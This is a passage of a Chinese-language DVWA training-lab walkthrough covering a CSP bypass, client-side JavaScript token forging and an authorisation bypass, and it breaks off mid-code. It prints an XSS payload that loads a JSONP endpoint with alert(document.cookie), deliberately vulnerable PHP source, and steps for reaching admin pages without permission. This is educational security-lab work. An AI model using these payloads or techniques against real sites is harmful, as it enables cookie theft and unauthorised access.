    "</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"
"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>幸运的是这里留了一个include参数，并且该参数内容会直接插入body中，我们直接利用即可，但这里并不是直接插入script标签，因为没有unsafe_inline，因此并不会当做脚本执行。构造如下：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">include=&lt;script src=source/jsonp.php?callback=<span class="token function">alert</span><span class="token punctuation">(</span>document.cookie<span class="token punctuation">)</span>>&lt;/script><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113161238449.png" alt="image-20240113161238449"></p>
<p>这里加载jsonp.php的代码，并修改callback参数即可成功弹窗</p>
<h2 id="Impossible-13">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$headerCSP</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Content-Security-Policy: script-src 'self';"</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$headerCSP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"
    "</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"
"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'
&lt;form name="csp" method="POST">
    &lt;p>Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p>&lt;p>The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p>
    &lt;p>1+2+3+4+5=&lt;span id="answer">&lt;/span>&lt;/p>
    &lt;input type="button" id="solve" value="Solve the sum" />
&lt;/form>

&lt;script src="source/impossible.js">&lt;/script>
'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里主要是下面文件发生了改动：jsonp_impossible.php：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: application/json; charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$outp</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"answer"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"solveSum ("</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$outp</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里指定了只能输出 solveSum，这里也就写死了，没法绕过</p>
<h1>0x14 JS Attacks</h1>
<h2 id="Low-14">Low</h2>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
$page<span class="token punctuation">[</span> <span class="token string">'body'</span> <span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token comment">/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/</span>
<span class="token operator">!</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">t</span><span class="token punctuation">(</span><span class="token parameter">n<span class="token punctuation">,</span>t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> r<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">65535</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">65535</span><span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">(</span>n<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>t<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token operator">|</span><span class="token number">65535</span><span class="token operator">&amp;</span>r<span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">r</span><span class="token punctuation">(</span><span class="token parameter">n<span class="token punctuation">,</span>t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> n<span class="token operator">&lt;&lt;</span>t<span class="token operator">|</span>n<span class="token operator">>>></span><span class="token number">32</span><span class="token operator">-</span>t<span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token parameter">n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>o<span class="token punctuation">,</span>u<span class="token punctuation">,</span>c<span class="token punctuation">,</span>f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">t</span><span class="token punctuation">(</span><span class="token function">r</span><span class="token punctuation">(</span><span class="token function">t</span><span class="token punctuation">(</span><span class="token function">t</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">t</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>o<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">o</span><span class="token punctuation">(</span><span class="token parameter">n<span class="token punctuation">,</span>t<span class="token punctuation">,</span>r<span class="token punctuation">,</span>o<span class="token punctuation">,</span>u<span class="token punctuation">,</span>c<span class="token punctuation">,</span>f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">e</span><span class="token punctuation">(</span>t<span class="token operator">&amp;</span>r<span class="token operator">|</span><span class="token operator">~</span>t<span class="token operator">&amp;</span>o<span class="token punctuation">,</span>n<span class="token punctuation">,</span>t<span class="token punctuation">,</span>u<span class="token punctuation">,</span>c<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">u</span><span class="token punctuation">(</span><span class="token parameter">n<span class="token punctuation">,</span>t<span class="token punctuation">,</span>r<span class="token punctuation">,</span>o<span class="token punctuation">,</span>u<span class="token punctuation">,</span>c<span class="token punctuation">,</span>f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">e</span><span class="token punctuation">(</span>t<span class="token operator">&amp;</span>o<span class="token operator">|</span>r<span class="token operator">&amp;</span><span class="token operator">~</span>o<span class="token punctuation">,</span>n<span class="token punctuation">,</span>t<span class="token punctuation">,</span>u<span class="token punctuation">,</span>c<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token parameter">n<span class="token punctuation">,</span>t<span class="token punctuation">,</span>r<span class="token punctuation">,</span>o<span class="token punctuation">,</span>u<span class="token punctuation">,</span>c<span class="token punctuation">,</span>f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">e</span><span class="token punctuation">(</span>t<span class="token operator">^</span>r<span class="token operator">^</span>o<span class="token punctuation">,</span>n<span class="token punctuation">,</span>t<span class="token punctuation">,</span>u<span class="token punctuation">,</span>c<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token parameter">n<span class="token punctuation">,</span>t<span class="token punctuation">,</span>r<span class="token punctuation">,</span>o<span class="token punctuation">,</span>u<span class="token punctuation">,</span>c<span class="token punctuation">,</span>f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">e</span><span class="token punctuation">(</span>r<span class="token operator">^</span><span class="token punctuation">(</span>t<span class="token operator">|</span><span class="token operator">~</span>o<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>t<span class="token punctuation">,</span>u<span class="token punctuation">,</span>c<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">i</span><span class="token punctuation">(</span><span class="token parameter">n<span class="token punctuation">,</span>r</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>n<span class="token punctuation">[</span>r<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">|=</span><span class="token number">128</span><span class="token operator">&lt;&lt;</span>r<span class="token operator">%</span><span class="token number">32</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span><span class="token number">14</span><span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">+</span><span class="token number">64</span><span class="token operator">>>></span><span class="token number">9</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>r<span class="token punctuation">;</span><span class="token keyword">var</span> e<span class="token punctuation">,</span>i<span class="token punctuation">,</span>a<span class="token punctuation">,</span>d<span class="token punctuation">,</span>h<span class="token punctuation">,</span>l<span class="token operator">=</span><span class="token number">1732584193</span><span class="token punctuation">,</span>g<span class="token operator">=</span><span class="token operator">-</span><span class="token number">271733879</span><span class="token punctuation">,</span>v<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1732584194</span><span class="token punctuation">,</span>m<span class="token operator">=</span><span class="token number">271733878</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>e<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>e<span class="token operator">&lt;</span>n<span class="token punctuation">.</span>length<span class="token punctuation">;</span>e<span class="token operator">+=</span><span class="token number">16</span><span class="token punctuation">)</span>i<span class="token operator">=</span>l<span class="token punctuation">,</span>a<span class="token operator">=</span>g<span class="token punctuation">,</span>d<span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">rot13</span><span class="token punctuation">(</span><span class="token parameter">inp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> inp<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[a-zA-Z]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token operator">&lt;=</span><span class="token string">"Z"</span><span class="token operator">?</span><span class="token number">90</span><span class="token operator">:</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token punctuation">(</span>c<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token operator">?</span>c<span class="token operator">:</span>c<span class="token operator">-</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">generate_token</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> phrase <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"phrase"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rot13</span><span class="token punctuation">(</span>phrase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">generate_token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token constant">EOF</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以到上述代码主要是用来生成一个token，大概逻辑看看我们可以知道，上述代码会在前端html找一个id名为phrase的元素，随后拿到其value值，接着按该值生成独属于其的token。元素位置如下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113162311368.png" alt="image-20240113162311368"></p>
<p>而这里倘若我们直接将其修改为success，会发现页面说我们是一个无效的token，这是因为我们采用的是ChangeMe的token，因此我们需要想办法拿到success生成的token，幸运的是这在前端就生成了，我们只需要改一下phrase的值，在前端运行一下即可</p>
<p>这里在开发者工具中找到对应的js代码地址，在生成token函数的地方下一个断点，接着刷新页面运行，之后会在右侧出现phrase，接着修改其值为success，之后继续运行，会发现，token发生了变化。这时我们直接修改为success提交，会发现提交成功</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113163247276.png" alt="image-20240113163247276"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113163341621.png" alt="image-20240113163341621"></p>
<h2 id="Medium-14">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;script src="'</span> <span class="token operator">.</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'vulnerabilities/javascript/source/medium.js">&lt;/script>'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>我们跟踪medium.js：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">do_something</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span>n<span class="token operator">=</span>e<span class="token operator">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>n<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>n<span class="token operator">--</span><span class="token punctuation">)</span>t<span class="token operator">+=</span>e<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> t
<span class="token punctuation">&#125;</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">do_elsesomething</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"XX"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">do_elsesomething</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 						document<span class="token operator">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"token"</span><span class="token punctuation">)</span><span class="token operator">.</span>value<span class="token operator">=</span><span class="token function">do_something</span><span class="token punctuation">(</span>e<span class="token operator">+</span>document<span class="token operator">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phrase"</span><span class="token punctuation">)</span><span class="token operator">.</span>value<span class="token operator">+</span><span class="token string double-quoted-string">"XX"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里看了一下逻辑，发现其会取token的值为xx+id名为phrase的值+xx，接着传给do_something函数，该函数将传入的参数倒序输出</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113164139019.png" alt="image-20240113164139019"></p>
<p>我们看到上述的token值为XXeMegnahCXX，这意味着我们只需要将其改为XXsseccusXX即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113164255199.png" alt="image-20240113164255199"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113164240377.png" alt="image-20240113164240377"></p>
<p>可以看到成功修改</p>
<h2 id="High-14">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;script src="'</span> <span class="token operator">.</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'vulnerabilities/javascript/source/high.js">&lt;/script>'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">var a=[<span class="token string">'fromCharCode'</span><span class="token punctuation">,</span><span class="token string">'toString'</span><span class="token punctuation">,</span><span class="token string">'replace'</span><span class="token punctuation">,</span><span class="token string">'BeJ'</span><span class="token punctuation">,</span><span class="token string">'\x5cw+'</span><span class="token punctuation">,</span><span class="token string">'Lyg'</span><span class="token punctuation">,</span><span class="token string">'SuR'</span><span class="token punctuation">,</span><span class="token string">'(w()&#123;\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:&#123;&#125;;p(Y.3N).........!'</span><span class="token string">'[b('</span>0x2<span class="token string">')](/^/,String))&#123;while(f--)&#123;i[h(f)]=g[f]||h(f);&#125;g=[function(k)&#123;if('</span>wpA<span class="token string">'!==b('</span>0x3<span class="token string">'))&#123;return i[k];&#125;else&#123;while(f--)&#123;i[k(f)]=g[f]||k(f);&#125;g=[function(l)&#123;return i[l];&#125;];k=function()&#123;return b('</span>0x4<span class="token string">');&#125;;f=0x1;&#125;&#125;];h=function()&#123;return b('</span>0x4<span class="token string">');&#125;;f=0x1;&#125;;while(f--)&#123;if(g[f])&#123;if(b('</span>0x5<span class="token string">')===b('</span>0x6<span class="token string">'))&#123;return i[h];&#125;else&#123;d=d[b('</span>0x2<span class="token string">')](new RegExp('</span>\x5cb<span class="token string">'+h(f)+'</span>\x5cb<span class="token string">','</span>g<span class="token string">'),g[f]);&#125;&#125;&#125;return d;&#125;(b('</span>0x7<span class="token string">'),0x3e,0x137,b('</span>0x8<span class="token string">')[b('</span>0x9<span class="token string">')]('</span>|'<span class="token punctuation">)</span><span class="token selector">,0x0,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里的代码是被混淆了，我们用在线网站解密一下：<a target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/#">http://deobfuscatejavascript.com/#</a></p>
<p>重点代码在后面：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">do_something</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> n <span class="token operator">=</span> e<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> n <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> n<span class="token operator">--</span><span class="token punctuation">)</span> t <span class="token operator">+=</span> e<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> t
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">token_part_3</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token string">"ZZ"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">+</span> y<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">token_part_2</span><span class="token punctuation">(</span>e <span class="token operator">=</span> <span class="token string">"YY"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span>e <span class="token operator">+</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">token_part_1</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">do_something</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"phrase"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"phrase"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">token_part_2</span><span class="token punctuation">(</span><span class="token string">"XX"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"send"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> token_part_3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">token_part_1</span><span class="token punctuation">(</span><span class="token string">"ABCD"</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里首先将phrase的value赋值为空，接着调用<code>token_part_1</code>函数，将phrase的值倒序输出，随后延迟300s调用token_part_2函数，YY经过sha加密，赋值给token的value，然后当我们点击submit按钮时，调用token_part_3函数将token值拼接ZZ接着经过sha加密，赋值给token的value</p>
<p>这里可以看到我们输入的success，与这些代码根本无关，因为其phrase的值始终被设置为0，我们进F12调试看看</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113165956794.png" alt="image-20240113165956794"></p>
<p>我们在右侧下个对于鼠标click的断点，接着我们点击上面的文本框，会发现我们成功进入断点调试，接着一直按运行键，会发现左侧出现了我们之前解混淆的js代码，接着我们对part1函数下断点，同时取消对click的断点</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113170103903.png" alt="image-20240113170103903"></p>
<p>然后去控制台设置phrase的值为success，按下图所示。接着回车一下，随后放行，会发现在输入框中出现succes，接着我们点击submit按钮发送即可发现成功修改</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113170302051.png" alt="image-20240113170302051"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113170500908.png" alt="image-20240113170500908"></p>
<h2 id="Impossible-14">Impossible</h2>
<p>You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.</p>
<p>直接把用户输入的地方关了，这无从下手了。。。。。</p>
<h1>0x15 Authorisation Bypass</h1>
<p>This page should only be accessible by the admin user. Your challenge is to gain access to the features using one of the other users, for example <em>gordonb</em> / <em>abc123</em>.</p>
<p>这意味着这是一个未授权访问的漏洞，我们的目标是以gordonb这一低级别用户访问管理员才可以访问的页面</p>
<h2 id="Low-15">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/*
Nothing to see here for this vulnerability, have a look
instead at the dvwaHtmlEcho function in:

* dvwa/includes/dvwaPage.inc.php

*/</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可见这里没有任何限制，是存在未授权访问的，让我们先以低级别用户登录看看</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113180442459.png" alt="image-20240113180442459"></p>
<p>如上图，可以看到我们当前用户是没有权限访问到刚才的页面的，接下来我们尝试抓包，看一下刚刚管理员页面的url地址</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113180617876.png" alt="image-20240113180617876"></p>
<p>如上图，接下来让我们尝试直接访问该url地址</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113181023564.png" alt="image-20240113181023564"></p>
<p>可以看到成功未授权</p>
<h2 id="Medium-15">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/*
Only the admin user is allowed to access this page.

Have a look at these two files for possible vulnerabilities: 

* vulnerabilities/authbypass/get_user_data.php
* vulnerabilities/authbypass/change_user_details.php

*/</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"Unauthorised"</span><span class="token punctuation">;</span>
